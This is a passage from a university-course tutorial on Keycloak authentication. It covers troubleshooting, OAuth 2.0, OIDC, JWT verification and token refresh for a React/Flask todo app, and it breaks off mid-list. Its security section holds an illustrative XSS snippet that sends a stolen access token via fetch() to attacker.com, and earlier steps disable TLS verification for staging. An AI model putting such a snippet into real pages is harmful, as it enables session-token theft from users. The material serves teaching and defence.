# Common issues:
# - Database password mismatch (check values.yaml)
# - Database not ready (wait longer)
# - Port conflicts (check if ports are in use)
```

### "Invalid Redirect URI" Error

**Problem**: Client not configured with correct redirect URI. This happens when the URL you're accessing your frontend from doesn't match the configured redirect URIs in Keycloak.

**Common scenario**: You configured `http://localhost:3000/*` but accessed via `http://127.0.0.1:3000`.

**Solution 1 - Use localhost**:
Always access your frontend at `http://localhost:3000`.

**Solution 2 - Manual configuration**:
1. Go to Keycloak Admin Console → Clients → Your client
2. Check "Valid Redirect URIs" includes the URL shown in the error
3. Add the missing URL (e.g., `http://127.0.0.1:3000/*`)
4. Add to "Web Origins" as well (e.g., `http://127.0.0.1:3000`)
5. Save changes

### CORS Errors

**Problem**: Browser blocks requests from your frontend to Keycloak.

**Solution**:
1. Go to Clients → Your client
2. Add your frontend URL to "Web Origins"
3. Use `http://localhost:3000` for development
4. Or use `+` to allow all valid redirect URIs

### Token Expired

**Problem**: Access token expired (default: 5 minutes).

**Solution**: Refresh the token before making API calls:

```javascript
// Refresh if expires in < 30 seconds
await keycloak.updateToken(30);
```

### Backend Error: "Failed to resolve 'keycloak.ltu-m7011e-your-name.se'" or "Could not fetch public keys"

**Problem**: The backend cannot connect to Keycloak because you're using the placeholder URL instead of your actual Keycloak domain.

**Symptoms**:
- `WARNING: Could not fetch public keys: HTTPSConnectionPool(host='keycloak.ltu-m7011e-your-name.se', port=443): Max retries exceeded`
- `NameResolutionError: Failed to resolve 'keycloak.ltu-m7011e-your-name.se'`
- Frontend loads but API calls fail with 401 or 500 errors
- Backend shows connection errors on startup

**Solution**:

1. **Update Backend Configuration** (example-part-2 and example-part-3):

```bash
# Edit backend/app.py
nano example-part-2-todo-secure/backend/app.py
nano example-part-3-todo-rbac/backend/app.py
```

Change the KEYCLOAK_URL line:
```python
# Change this:
KEYCLOAK_URL = "https://keycloak.ltu-m7011e-YOUR-NAME.se"

# To your actual domain:
KEYCLOAK_URL = "https://keycloak.ltu-m7011e-johan.se"  # ← Use YOUR name
```

2. **Update Frontend Configuration** (all examples):

```bash
# Edit frontend/src/keycloak-config.js in each example
nano example-part-1-todo-basic/frontend/src/keycloak-config.js
nano example-part-2-todo-secure/frontend/src/keycloak-config.js
nano example-part-3-todo-rbac/frontend/src/keycloak-config.js
```

Change the url field:
```javascript
export const keycloakConfig = {
  url: 'https://keycloak.ltu-m7011e-johan.se',  // ← Use YOUR name
  realm: 'myapp',
  clientId: 'my-frontend-app'
};
```

3. **Restart Both Backend and Frontend**:

```bash
# Stop the backend (Ctrl+C) and restart
cd example-part-2-todo-secure
./start-backend.sh

# In another terminal, restart frontend
cd example-part-2-todo-secure
./start-frontend.sh
```

4. **Verify**: You should see "✓ Successfully fetched Keycloak public keys" when the backend starts.

**See also**: Configuration Required section in Part 4 above for complete setup instructions.

### Flask Backend Error: "module 'jwt' has no attribute 'ExpiredSignatureError'"

**Problem**: Both `PyJWT` and `jwt` provide a Python module named `jwt`, so installing both can break the imports used by this example.

**Symptoms**:
- `AttributeError: module 'jwt' has no attribute 'ExpiredSignatureError'`
- `AttributeError: module 'jwt' has no attribute 'get_unverified_header'`
- JWT token verification fails

**Solution**:

```bash
# 1. Uninstall the conflicting jwt package
python -m pip uninstall -y jwt

# 2. Ensure only PyJWT is installed
python -m pip install --force-reinstall PyJWT==2.8.0

# 3. Verify the correct package is installed
python3 -c "import jwt; print(jwt.__version__)"
# Should output: 2.8.0

# 4. Test that all required attributes exist
python3 -c "import jwt; print(hasattr(jwt, 'ExpiredSignatureError'))"
# Should output: True
```

**Prevention**: Always use `PyJWT` (not `jwt`) in your requirements.txt:
```txt
PyJWT==2.8.0  # ✓ Correct
jwt           # ✗ Wrong - causes conflicts!
```

### Certificate Warnings

This is normal with Let's Encrypt staging certificates! For production:

1. Change `certIssuer: letsencrypt-prod` in values.yaml
2. Redeploy: `helm upgrade keycloak -n keycloak ./keycloak-chart`
3. Wait for certificate to be issued (1-2 minutes)
4. **Update automation scripts**: Change the `INSECURE` flag in all scripts

**Bash scripts** - Change at the top of each file:
```bash
INSECURE=false  # Was: INSECURE=true
```

**Python scripts** - Change at the top of each file:
```python
INSECURE = False  # Was: INSECURE = True
```

**Why?** Staging certificates are signed by a test CA that browsers and normal trust stores do not trust, so scripts use `INSECURE=true` to bypass verification. Production certificates are properly trusted, so you should set `INSECURE=false` for better security.

The flag automatically controls:
- Bash: `-k` curl option (insecure mode)
- Python: `verify=False` in requests (SSL verification)

---

## Part 11: Cleanup

### Remove Everything

```bash
./uninstall.sh
```

Or manually:

```bash
# Delete Keycloak (includes PostgreSQL)
helm uninstall keycloak -n keycloak

# Delete data
kubectl delete pvc -n keycloak --all

# Delete namespace
kubectl delete namespace keycloak
```

---

## Understanding the Technology

This section provides a comprehensive technical explanation of OAuth 2.0, OpenID Connect, JWT, and how Keycloak implements these standards.

### The Foundation: OAuth 2.0

**OAuth 2.0** is an **authorization framework** (RFC 6749) that enables applications to obtain limited access to user resources without exposing credentials. It answers the question: **"What can you access?"**

Think of OAuth 2.0 like a hotel key card system for your todo app:
- You (Resource Owner) want to access your todos
- Keycloak (Authorization Server) verifies your identity
- Keycloak gives you an access token with specific permissions (e.g., "can add todos", "is admin")
- The token grants access to your todos (Resource Server) but not others'
- The Flask API trusts the token without needing to verify your password every time

This is fundamentally different from traditional username/password authentication where you'd have to send credentials with every request.

#### Key Concepts

**Roles in OAuth 2.0 (as applied to our todo app):**
- **Resource Owner** - You, the user who owns their personal todos
- **Client** - The React frontend application that displays and manages todos
- **Authorization Server** - Keycloak, which verifies your identity and issues tokens
- **Resource Server** - The Flask API that stores todos and validates tokens before allowing access

**Grant Types:**

OAuth 2.0 defines multiple "flows" for obtaining access tokens, each suited for different scenarios:

1. **Authorization Code with PKCE** - Used by the public React client
   - Best for: Browser, native, and server applications with the appropriate client settings
   - Security: This SPA exchanges the code in the browser using a PKCE verifier; a confidential server client can exchange it on its backend
   - **This is what we use in our tutorial**

2. **Implicit** - Deprecated and insecure
   - Previously used for: Single Page Applications (SPAs)
   - Why deprecated: Tokens exposed in browser URL, vulnerable to theft
   - Modern alternative: Authorization Code with PKCE

3. **Client Credentials** - Machine-to-machine authentication
   - Used for: Backend services communicating with each other
   - No user involved: Service authenticates with client ID and secret
   - Todo app example: A scheduled task that backs up todos doesn't need a user login

4. **Resource Owner Password** - Direct username/password exchange
   - Highly discouraged: User gives credentials directly to application
   - Do not enable this grant for the frontend; the admin automation scripts use a separate admin-cli client
   - Problem: Defeats OAuth's purpose of not sharing credentials
   - Todo app: We don't use this - users never give passwords to our React app

5. **Refresh Token** - Exchange refresh token for new access token
   - Purpose: Obtain new access tokens without re-authentication
   - Security: Can be revoked, enables long-lived sessions
   - Todo app example: Refresh tokens keep an active session usable within configured idle and maximum session limits

#### OAuth 2.0 Architecture

```mermaid
graph TB
    subgraph "OAuth 2.0 Ecosystem"
        RO[Resource Owner<br/>User]
        C[Client Application<br/>React/Flask App]
        AS[Authorization Server<br/>Keycloak]
        RS[Resource Server<br/>Your API]
    end

    RO -->|1. Initiates login| C
    C -->|2. Redirect to login| AS
    RO -->|3. Authenticate| AS
    AS -->|4. Authorization code| C
    C -->|5. Exchange code| AS
    AS -->|6. Access token| C
    C -->|7. API request + token| RS
    RS -->|8. Verify token| AS
    AS -->|9. Token valid| RS
    RS -->|10. Protected data| C
    C -->|11. Display data| RO

    style RO fill:#e1f5ff
    style C fill:#fff3e0
    style AS fill:#f3e5f5
    style RS fill:#e8f5e9
```

**Why this architecture matters:**
- **Separation of concerns**: Authentication (AS) is separate from your application (C) and data (RS)
- **Scalability**: One Authorization Server can serve many applications
- **Security**: Resource Server never sees user credentials
- **Flexibility**: Easy to add new applications without changing authentication logic

#### OAuth 2.0 Authorization Code Flow

Authorization Code with PKCE supports public clients such as this SPA as well as confidential server clients. It uses a two-step process: first obtaining an authorization code, then exchanging it for tokens. This prevents tokens from ever appearing in the browser's address bar where they could be intercepted.

**Key characteristics:**
- **Two-phase exchange**: Code → Tokens
- **PKCE-bound token exchange**: This SPA receives tokens in browser memory, while tokens stay out of the redirect URL
- **State parameter**: Prevents CSRF attacks
- **Single-use codes**: Each code can only be used once
- **Short code lifetime**: Typically 60 seconds

```mermaid
sequenceDiagram
    participant User as 👤 Browser<br/>(User)
    participant React as ⚛️ React<br/>Frontend
    participant KC as 🔐 Keycloak<br/>(Auth Server)
    participant API as 🐍 Flask<br/>API

    User->>React: 1. Click "Login"

    React->>KC: 2. Redirect to /auth<br/>client_id, redirect_uri,<br/>response_type=code,<br/>scope=openid profile email

    KC->>User: 3. Show login page

    User->>KC: 4. Submit credentials<br/>(username + password)

    Note over KC: 5. Verify credentials<br/>Create session<br/>Generate code

    KC->>React: 6. Redirect with code<br/>http://localhost:3000/?code=ABC123

    Note over React: Extract code from URL

    React->>KC: 7. POST /token<br/>code=ABC123<br/>client_id, redirect_uri<br/>grant_type=authorization_code

    Note over KC: 8. Validate code<br/>Check single-use<br/>Verify not expired<br/>Issue tokens

    KC->>React: 9. Return tokens<br/>{access_token, id_token,<br/>refresh_token, expires_in}

    Note over React: 10. Store tokens<br/>in memory<br/>(not localStorage!)

    User->>React: 11. Add todo

    React->>API: 12. POST /api/todos<br/>Authorization: Bearer <access_token>

    Note over API: 13. Extract token<br/>Get kid from header

    API->>KC: 14. GET /certs<br/>(fetch public keys)

    KC->>API: 15. Return public keys

    Note over API: 16. Verify signature<br/>Validate claims<br/>Extract user/roles

    API->>React: 17. 201 Created<br/>{id, text, user_id}

    React->>User: 18. Show new todo
```

**Understanding each step:**

**Steps 1-2 (Authorization Request):**
The React app constructs a URL with these critical parameters:
- `client_id`: Identifies your application to Keycloak
- `redirect_uri`: Where to send the user after login (must be pre-registered)
- `response_type=code`: Tells Keycloak we want an authorization code
- `scope`: What user information we're requesting (openid, profile, email)
- `state`: Random value to prevent CSRF (Cross-Site Request Forgery)

**Steps 3-4 (User Authentication):**
Keycloak presents its login page. Notice that your application never sees the user's credentials - they go directly to Keycloak. This is a key security benefit of OAuth 2.0.

**Step 5 (Code Generation):**
After successful authentication, Keycloak:
1. Creates a server-side session
2. Generates a single-use authorization code
3. Links the code to the session and client_id
4. Sets a short expiration (typically 60 seconds)

**Step 6 (Authorization Response):**
Keycloak redirects back to your app with the code in the URL. The code is single-use and bound to the client, redirect URI, and PKCE challenge. The public SPA has no client secret.

**Steps 7-9 (Token Exchange):**
The JavaScript adapter exchanges the code for tokens from the browser over HTTPS:
- The request includes your client_id and the PKCE code_verifier
- For confidential clients, you'd also send client_secret
- Keycloak verifies the code is valid, not expired, and not already used
- Only then does Keycloak issue the actual tokens

**Why use a code instead of returning tokens directly?**
- **Security**: Tokens never appear in the browser's address bar where they could be logged or intercepted
- **Single-use**: Even if a code is intercepted, it can only be used once
- **Time-limited**: Codes expire in seconds, tokens in minutes/hours
- **Binding**: The code is tied to the specific client_id that requested it

**Steps 10-18 (Using the Access Token):**
Now your app has an access token and can make authorized API calls. The Flask backend verifies each token without needing to call Keycloak (thanks to JWT's cryptographic signature), making this highly scalable.

### OpenID Connect (OIDC)

**OpenID Connect** is an **authentication layer** built on top of OAuth 2.0 (RFC 6749). It answers: **"Who are you?"**

**The problem OIDC solves:**
Imagine you're building the todo app with just OAuth 2.0. You can get an access token that allows you to call the API, but you don't know WHO the user is. Is it John? Mary? An admin? OAuth 2.0 doesn't tell you - it just says "this token can access todos."

**How OIDC solves it:**
OIDC adds an **ID Token** that contains user information: name, email, username, roles. Now your React app can display "Welcome, John!" and show/hide admin features based on the user's role.

#### What OIDC Adds to OAuth 2.0

1. **ID Token** - A JWT containing user identity information
   - Contains user's name, email, username
   - Signed by Keycloak so you know it's authentic
   - In our todo app: Used to display "Welcome, testuser!" in the header

2. **UserInfo Endpoint** - Standardized endpoint to get complete user profile
   - URL: `https://keycloak.../realms/myapp/protocol/openid-connect/userinfo`
   - Returns: Full user profile (photo, address, phone, etc.)
   - The adapter exposes `loadUserInfo()` for this endpoint. The included app uses `loadUserProfile()`, which calls the Keycloak account API instead.

3. **Standard Claims** - Predefined user attributes everyone understands
   - `sub`: Unique user ID (never changes, even if username changes)
   - `name`: Full name ("Test User")
   - `preferred_username`: Username ("testuser")
   - `email`: Email address
   - In our todo app: We show these in the user info section

4. **Discovery** - Standardized metadata endpoint
   - URL: `https://keycloak.../realms/myapp/.well-known/openid-configuration`
   - Returns: All endpoints, supported features, signing algorithms
   - Benefits: Clients can auto-configure themselves

#### OIDC Scopes in the Todo App

When our React app requests tokens, it includes scopes that determine what user information Keycloak includes:

```javascript
// In our keycloak.init():
scope: "openid profile email"
```

**What each scope provides:**

- `openid` - **Required** - Turns on OIDC mode
  - Returns: `sub` (user ID like "f4c8a9e6-1234...")
  - Without this: You only get OAuth 2.0, no user info

- `profile` - Requests profile information
  - Returns: name, family_name, given_name, preferred_username
  - In todo app: We display "Welcome, Test User!" using this

- `email` - Requests email address
  - Returns: email, email_verified
  - In todo app: Shown in user info panel

- `address` - Postal address (not used in todo app)

- `phone` - Phone number (not used in todo app)

#### OIDC vs OAuth 2.0 in Our Todo App

| Aspect | OAuth 2.0 Only | OIDC (What We Use) |
|--------|----------------|---------------------|
| Purpose | "Can access todos" | "Can access todos AND know who you are" |
| What you get | Access Token | Access Token + ID Token |
| User display | Can't show username | "Welcome, testuser!" |
| Role checking | Must decode access token | Easy - check `realm_access.roles` |
| Example | Generic "User logged in" | "Test User (testuser) logged in as admin" |

```mermaid
graph LR
    subgraph "OAuth 2.0 Only"
        A1[React App] -->|Access Token| A2[Flask API]
        A2 -->|✅ Can call API| A3[Get Todos]
        A1 -->|❌ Don't know who| A4[Show ???]
    end

    subgraph "With OIDC Our Todo App"
        B1[React App] -->|Access Token| B2[Flask API]
        B1 -->|ID Token| B5[User Info]
        B2 -->|✅ Can call API| B3[Get Todos]
        B5 -->|✅ Know user| B4["Welcome,<br/>testuser!"]
        B5 -->|✅ Know role| B6[Show/Hide<br/>Admin]
    end

    style A4 fill:#ffebee
    style B4 fill:#e8f5e9
    style B6 fill:#e8f5e9
```

**In our todo app:**
- **ID Token**: Establishes user identity for the frontend
- **Access Token roles**: `keycloak.hasRealmRole()` reads the access token, while `loadUserProfile()` loads display information
- **Access Token**: Sent to Flask API to prove we can access/modify todos
- **Both together**: Enable secure, personalized user experience

### JSON Web Tokens (JWT)

**JWT** (RFC 7519) is a compact, URL-safe token format for transmitting claims between parties. Think of it as a digitally-signed envelope containing user information and permissions.

**Why JWTs in the todo app:**
When you add a todo, your React app sends an HTTP request to the Flask API. The API needs to know:
1. **Who you are** - To associate the todo with your user ID
2. **What you can do** - To check if you have permission to add todos
3. **That this is authentic** - To verify you're not an imposter

JWTs solve all three problems in one self-contained package that doesn't require database lookups.

#### JWT Structure

A JWT consists of three Base64URL-encoded parts separated by dots:

```mermaid
graph LR
    JWT["eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"]

    Header["Header<br/>{'alg':'RS256',<br/>'typ':'JWT',<br/>'kid':'abc123'}"]
    Payload["Payload<br/>{'sub':'user-123',<br/>'name':'Test User',<br/>'roles':['admin']}"]
    Signature["Signature<br/>(Cryptographic<br/>proof)"]

    JWT -.->|Base64 decode| Header
    JWT -.->|Base64 decode| Payload
    JWT -.->|Verify with<br/>public key| Signature

    style Header fill:#e3f2fd
    style Payload fill:#fff3e0
    style Signature fill:#f3e5f5
```

```
eyJhbGciOi...  .  eyJzdWIiOi...  .  SflKxwRJSM...
      │                │                 │
   Header           Payload          Signature
  (Algorithm)    (User data &      (Proof it's
   & Key ID      permissions)        authentic)
```

#### JWT Structure Deep Dive

**1. Header** - Tells us how to verify the token

In our todo app, Keycloak creates a header like this:

```json
{
  "alg": "RS256",
  "typ": "JWT",
  "kid": "FJ86GcF3j"
}
```

**Why each field matters:**
- `alg`: Flask needs to know which algorithm to use for verification
- `typ`: Identifies this as a JWT (vs other token types)
- `kid`: Keycloak has multiple keys; this tells Flask which public key to fetch

**Common algorithms:**
- `RS256` - RSA with SHA-256 (what we use)
  - Asymmetric: Keycloak signs with private key, Flask verifies with public key
  - Most secure for distributed systems
  - Public key can be shared safely

- `HS256` - HMAC with SHA-256 (symmetric)
  - Both sides share a secret
  - Simpler but less scalable
  - Not suitable when multiple services need to verify

- `ES256` - ECDSA with SHA-256 (asymmetric)
  - Smaller keys, faster
  - Gaining popularity

**2. Payload (Claims)**
```json
{

  "iss": "https://keycloak.ltu-m7011e-johan.se/realms/myapp",
  "sub": "f4c8a9e6-1234-5678-90ab-cdef12345678",
  "aud": "todo-api",
  "exp": 1735689600,
  "nbf": 1735689300,
  "iat": 1735689300,
  "jti": "abc-123-def-456",


  "name": "Test User",
  "given_name": "Test",
  "family_name": "User",
  "preferred_username": "testuser",
  "email": "test@example.com",
  "email_verified": true,


  "realm_access": {
    "roles": ["user", "admin"]
  },
  "resource_access": {
    "my-frontend-app": {
      "roles": ["view-profile"]
    }
  },
  "scope": "openid profile email",
  "session_state": "xyz-789",
  "acr": "1",
  "azp": "my-frontend-app",
  "typ": "Bearer"
}
```

**3. Signature**

For RS256 (RSA asymmetric signing):

```
signature = RSA-SHA256(
  base64urlEncode(header) + "." + base64urlEncode(payload),
  privateKey
)
```

**Key properties:**
- **Stateless** - Token contains all necessary information
- **Self-contained** - No database lookup needed to verify
- **Tamper-proof** - Any modification invalidates the signature
- **Not encrypted** - Anyone can decode and read (use HTTPS!)

#### Token Verification Process

When your Flask backend receives a JWT:

```python
def verify_token(token):
    # 1. Decode header (no verification yet)
    header = jwt.get_unverified_header(token)
    kid = header['kid']  # Key ID

    # 2. Fetch Keycloak's public keys
    keys = requests.get(
        "https://keycloak.../realms/myapp/protocol/openid-connect/certs"
    ).json()

    # 3. Find matching public key
    public_key = find_key_by_kid(keys, kid)

    # 4. Verify signature and validate claims
    decoded = jwt.decode(
        token,
        public_key,
        algorithms=['RS256'],
        audience='todo-api',
        issuer='https://keycloak.../realms/myapp',
        options={
            'verify_signature': True,   # Cryptographic verification
            'verify_exp': True,          # Check if expired
            'verify_nbf': True,          # Check if valid yet
            'verify_iss': True,          # Check issuer matches
            'verify_aud': True           # Check audience matches
        }
    )

    return decoded  # Token is valid!
```

**Why asymmetric signing (RS256)?**
- Keycloak holds **private key** (signs tokens)
- Your apps hold **public key** (verify tokens)
- Apps can verify tokens without calling Keycloak
- Public keys can be distributed safely
- More secure than shared secrets (HS256)

### Access Token vs ID Token vs Refresh Token

Keycloak issues three types of tokens:

#### 1. Access Token
**Purpose:** Authorize API requests

```json
{
  "typ": "Bearer",
  "azp": "my-frontend-app",
  "scope": "openid profile email",
  "realm_access": {
    "roles": ["user", "admin"]
  }
}
```

- Short-lived (5-15 minutes typical)
- Contains authorization info (roles, scopes)
- Sent in `Authorization: Bearer <token>` header
- Used by Resource Server (API) to authorize requests

#### 2. ID Token
**Purpose:** Prove user identity

```json
{
  "typ": "ID",
  "sub": "user-id-123",
  "name": "Test User",
  "email": "test@example.com",
  "email_verified": true
}
```

- Contains user profile information
- Conforms to OIDC specification
- Used by Client (frontend) to display user info
- Should NOT be sent to APIs (use access token instead)

#### 3. Refresh Token
**Purpose:** Obtain new access tokens without re-authentication

```json
{
  "typ": "Refresh",
  "scope": "openid profile email offline_access"
}
```

- Long-lived (days/weeks)
- Can be revoked by server
- Single-use or rotation (new refresh token with each use)
- Must be stored securely (not in localStorage!)
- Used at `/token` endpoint with `grant_type=refresh_token`

### Token Refresh Flow

**The problem:**
Access tokens are short-lived (typically 5-15 minutes) for security. But you don't want users to re-login every 5 minutes! That would be terrible UX.

**The solution:**
Refresh tokens are long-lived (days/weeks) and can be exchanged for new access tokens without requiring the user to log in again.

**In our todo app:**
Imagine you open the todo app at 9:00 AM and work on it throughout the day. Your access token expires at 9:05 AM, but the keycloak-js library automatically uses the refresh token to get a new access token at 9:04 AM (before expiration). You never notice anything - the app just works.

```mermaid
sequenceDiagram
    participant React as ⚛️ React<br/>Frontend
    participant API as 🐍 Flask<br/>API
    participant KC as 🔐 Keycloak

    Note over React: User working on todos<br/>for 10 minutes

    React->>API: 1. POST /api/todos<br/>Authorization: Bearer <expired_token>

    Note over API: 2. Check token expiration<br/>exp: 1638360000<br/>now: 1638360001<br/>❌ Expired!

    API->>React: 3. 401 Unauthorized<br/>{"error": "Token has expired"}

    Note over React: 4. Detect 401 error<br/>Automatically trigger<br/>token refresh

    React->>KC: 5. POST /token<br/>grant_type=refresh_token<br/>refresh_token=eyJhbGc...

    Note over KC: 6. Verify refresh token<br/>- Check signature<br/>- Check not expired<br/>- Check not revoked<br/>- Check session valid

    KC->>React: 7. Return new tokens<br/>{<br/>"access_token": "eyJnew...",<br/>"refresh_token": "eyJnew...",<br/>"expires_in": 300<br/>}

    Note over React: 8. Store new tokens<br/>Update in memory

    React->>API: 9. Retry POST /api/todos<br/>Authorization: Bearer <new_token>

    Note over API: 10. Verify new token<br/>✅ Valid!<br/>Create todo

    API->>React: 11. 201 Created<br/>{id, text, user_id}

    Note over React: User continues working<br/>Never noticed the refresh!
```

**Key points:**

1. **Application-triggered refresh**: The adapter refreshes when the application calls `updateToken()`. The included app runs a periodic refresh; call and await `updateToken(30)` immediately before requests as well when adapting it.

2. **Refresh token rotation**: Keycloak can issue a new refresh token with each refresh. This limits the damage if a refresh token is stolen - it becomes invalid after first use.

3. **Revocation**: Refresh tokens and sessions can be revoked server-side. This API validates access tokens locally, so it does not detect session revocation until the access token expires; immediate revocation checks require introspection or another server-side mechanism. If you detect suspicious activity, revoke the refresh token and force re-login.

4. **Security trade-off**:
   - Short access token lifetime (5 min): Limits exposure if stolen
   - Long refresh token lifetime (30 days): Good user experience
   - Combined: Secure and convenient

**Configuration in our todo app:**

The React app explicitly calls the adapter to refresh tokens:

```javascript
// In App.js, keycloak checks token every 60 seconds
setInterval(() => {
  keycloak.updateToken(70).then(refreshed => {
    if (refreshed) {
      console.log('Token refreshed');
    }
  });
}, 60000);
```

This checks every minute: "Will my token expire in the next 70 seconds?" If yes, refresh it proactively.

### How Keycloak Implements These Standards

Keycloak is a complete **Identity and Access Management (IAM)** solution that implements:

1. **OAuth 2.0 Authorization Server**
   - Issues access tokens
   - Manages authorization codes
   - Handles token refresh

2. **OpenID Connect Provider**
   - Issues ID tokens
   - Provides UserInfo endpoint
   - Implements discovery (/.well-known/openid-configuration)

3. **JWT Token Issuer**
   - Signs tokens with RSA keys
   - Publishes public keys at `/certs` endpoint
   - Supports token introspection

4. **User Federation**
   - LDAP/Active Directory integration
   - Custom user storage providers
   - Social login (Google, GitHub, etc.)

5. **Additional Features**
   - Multi-factor authentication (TOTP, WebAuthn)
   - Single Sign-On (SSO) across applications
   - User self-registration and account management
   - Fine-grained authorization (policies, permissions)
   - Event logging and auditing

### Complete Authentication Flow with Keycloak

Let's walk through the complete end-to-end flow: from opening the todo app in your browser to successfully adding your first todo. This brings together all the concepts we've covered.

#### Real-World Scenario: First-Time User

You open http://localhost:3000 in your browser. You've never used the app before, so you need to log in. Let's trace every step:

```mermaid
sequenceDiagram
    participant Browser as 👤 Browser<br/>(User)
    participant React as ⚛️ React<br/>Todo Frontend
    participant KC as 🔐 Keycloak<br/>(Auth Server)
    participant API as 🐍 Flask<br/>Todo API

    Browser->>React: 1. Visit http://localhost:3000
    Note over React: App loads, runs keycloak.init()

    React->>KC: 2. Check auth status<br/>onLoad: 'login-required'
    Note over KC: No valid session exists

    KC-->>Browser: 3. Redirect to Keycloak login<br/>/auth?response_type=code&<br/>client_id=my-frontend-app&<br/>redirect_uri=http://localhost:3000

    Browser->>KC: 4. GET /auth<br/>(follow redirect)

    KC-->>Browser: 5. Show login page<br/>Username: _____<br/>Password: _____

    Browser->>KC: 6. POST credentials<br/>username: testuser<br/>password: test123

    Note over KC: 7. Authenticate user<br/>✓ Verify password<br/>✓ Create session<br/>✓ Generate auth code

    KC-->>Browser: 8. Redirect with code<br/>http://localhost:3000/?<br/>code=ABC123&session_state=...

    Browser->>React: 9. Load app with code in URL

    React->>KC: 10. Exchange code for tokens<br/>POST /token<br/>grant_type=authorization_code<br/>code=ABC123<br/>client_id=my-frontend-app

    Note over KC: 11. Validate code<br/>✓ Code matches session<br/>✓ Client authorized<br/>✓ Generate tokens

    KC-->>React: 12. Return tokens<br/>{<br/>  access_token: "eyJhbGc...",<br/>  id_token: "eyJhbGc...",<br/>  refresh_token: "eyJhbGc...",<br/>  expires_in: 300<br/>}

    Note over React: 13. Store tokens in memory<br/>Parse ID token:<br/>- sub: "user-uuid-123"<br/>- preferred_username: "testuser"<br/>- realm_access.roles: ["user"]

    React-->>Browser: 14. Render todo app UI<br/>Welcome, testuser!<br/>[Add Todo: _____] [+]

    Browser->>React: 15. User types "Buy milk"<br/>and clicks Add button

    React->>API: 16. POST /api/todos<br/>Authorization: Bearer eyJhbGc...<br/>Content-Type: application/json<br/>{ "text": "Buy milk" }

    Note over API: 17. Extract token from header<br/>Decode header (unverified)<br/>Extract kid: "abc-key-123"

    API->>KC: 18. GET /certs<br/>(fetch public keys)

    KC-->>API: 19. Return public keys<br/>{ "keys": [{<br/>  "kid": "abc-key-123",<br/>  "n": "...", "e": "..."<br/>}]}

    Note over API: 20. Verify JWT signature<br/>✓ Signature valid<br/>✓ Not expired<br/>✓ Correct issuer<br/>Extract: user_id, roles

    Note over API: 21. Authorization check passed<br/>Create todo:<br/>- id: 1<br/>- text: "Buy milk"<br/>- user_id: "user-uuid-123"<br/>- username: "testuser"

    API-->>React: 22. 201 Created<br/>{ "id": 1,<br/>  "text": "Buy milk",<br/>  "completed": false,<br/>  "username": "testuser" }

    React-->>Browser: 23. Update UI<br/>☐ Buy milk (testuser)
```

#### Step-by-Step Breakdown

**Phase 1: Initial Page Load (Steps 1-5)**

When you visit the todo app, React immediately initializes the Keycloak JavaScript adapter. Since you're not logged in, Keycloak redirects you to its login page. This happens automatically—you never see an empty todo list.

**Phase 2: User Authentication (Steps 6-8)**

You enter your credentials. Keycloak verifies them against its user database, creates a session, and generates a short-lived authorization code. Instead of sending tokens directly in the URL (insecure!), it sends this temporary code that can only be exchanged once.

**Phase 3: Token Exchange (Steps 9-12)**

The React app extracts the code from the URL and immediately exchanges it for real tokens. This happens in the background—the keycloak-js library handles it automatically. Keycloak returns:

- **Access Token**: Proves you're authorized to access the todo API
- **ID Token**: Contains identity claims; this app checks realm roles from the access token
- **Refresh Token**: Allows getting new tokens when access token expires

**Phase 4: User Session Established (Step 13-14)**

React stores these tokens in memory (not localStorage, for security). It parses the ID token to get your username and displays "Welcome, testuser!" The app is now fully functional.

**Phase 5: API Request with JWT (Steps 15-16)**

When you add a todo, React sends the access token in the Authorization header:

```javascript
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImFiYy1rZXktMTIzIn0.eyJzdWIiOiJ1c2VyLXV1aWQtMTIzIiwicHJlZmVycmVkX3VzZXJuYW1lIjoidGVzdHVzZXIiLCJyZWFsbV9hY2Nlc3MiOnsicm9sZXMiOlsidXNlciJdfSwiZXhwIjoxNzMwNzQ4MDAwLCJpc3MiOiJodHRwczovL2tleWNsb2FrLmx0dS1tNzAxMWUtam9oYW4uc2UvcmVhbG1zL215YXBwIn0.signature-here
```

**Phase 6: JWT Verification (Steps 17-20)**

The Flask API doesn't trust the token blindly. It:

1. **Extracts the key ID (kid)** from the token header
2. **Fetches Keycloak's public keys** (cached after first request)
3. **Verifies the RSA signature** using the matching public key
4. **Validates all claims**: expiration time, issuer, audience

This cryptographic verification ensures the token was issued by Keycloak and hasn't been tampered with.

**Phase 7: Authorization and Response (Steps 21-23)**

After successful verification, Flask extracts the user ID from the token and creates the todo. The response includes the username from the token, and React updates the UI immediately.

#### Key Security Features in This Flow

1. **Authorization Code Flow** (steps 6-12): Most secure OAuth 2.0 flow, keeps tokens out of browser history
2. **PKCE Protection**: The app explicitly selects `pkceMethod: 'S256'`, and the client enforces it
3. **Short-Lived Access Tokens**: Expire after 5 minutes, limiting damage if stolen
4. **Stateless API**: Flask doesn't need sessions or databases to verify authentication
5. **Asymmetric Cryptography**: Private key stays in Keycloak, public key verifies signatures
6. **No Shared Secrets**: The frontend is a "public" client—no client secret in JavaScript

#### What Makes This Secure?

Notice that the Flask API **never contacts Keycloak** during normal operation (except to fetch or refresh cached public keys). It doesn't ask "Is this token valid?"—it cryptographically *proves* validity by verifying the signature. This is why JWTs scale so well: millions of API requests can be validated without database lookups or network calls to the auth server.

### Security Considerations

#### Why HTTPS is Critical

JWTs are **signed** (tamper-proof) but **not encrypted** (anyone can decode):

```bash
# Anyone can decode a JWT!
echo "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9..." | base64 -d
```

**Without HTTPS:**
- Tokens can be intercepted in transit
- Attackers can steal tokens and impersonate users
- Man-in-the-middle attacks are trivial

**Always use HTTPS in production!**

#### Token Storage Security

| Location | Security | Notes |
|----------|----------|-------|
| **Memory** | ✅ Best | Lost on refresh, requires refresh token flow |
| **SessionStorage** | ⚠️ OK | Cleared on tab close, vulnerable to XSS |
| **LocalStorage** | ❌ Dangerous | Persists, highly vulnerable to XSS |
| **Cookie (HttpOnly)** | ✅ Good | Not accessible to JavaScript, requires backend |

**Our todo app uses memory** - most secure for SPAs.

#### Common Attack Vectors

**1. Cross-Site Scripting (XSS)**
```javascript
// Attacker injects malicious script
<script>
  const token = localStorage.getItem('access_token');
  fetch('https://attacker.com/steal?token=' + token);
</script>
```

**Mitigation:**
- Store tokens in memory only
